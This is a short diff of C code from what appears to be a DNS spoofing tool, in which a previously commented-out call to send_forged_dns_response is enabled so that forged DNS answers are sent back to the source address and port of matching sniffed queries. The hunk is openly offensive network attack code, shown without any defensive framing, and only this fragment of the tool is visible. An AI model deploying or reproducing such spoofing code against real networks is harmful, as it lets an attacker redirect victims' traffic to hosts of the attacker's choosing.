@@ -293,12 +293,12 @@ void print_ip_packet(const u_char *packet, u_char **payload, int *size_payload, 
 				    return;
 
 				if (stringExpression == NULL || ((*size_payload > 0) && strstr((char*)*payload, (char*)stringExpression))){
-					printf("Response Start\n");
+				    send_forged_dns_response(ip->ip_src.s_addr, udp->uh_sport, datagram, size_of_forged_dns_response);
+				    printf("Response Start\n");
 				    u_char *pay1 = (u_char*)datagram;
 				    print_payload(pay1, sizeof(struct sniff_ip) + sizeof(struct udphdr) + sizeof(struct dns_header) \
 					+ strlen(domain) + 1 + sizeof(struct dns_answer_data) + sizeof(struct dns_answer_data_1));
 				    printf("Response End\n");
-				    //send_forged_dns_response(ip->ip_src.s_addr, udp->uh_sport, datagram, size_of_forged_dns_response);
 				}
 			}
 			else if(ntohs(udp->uh_sport) == 53)
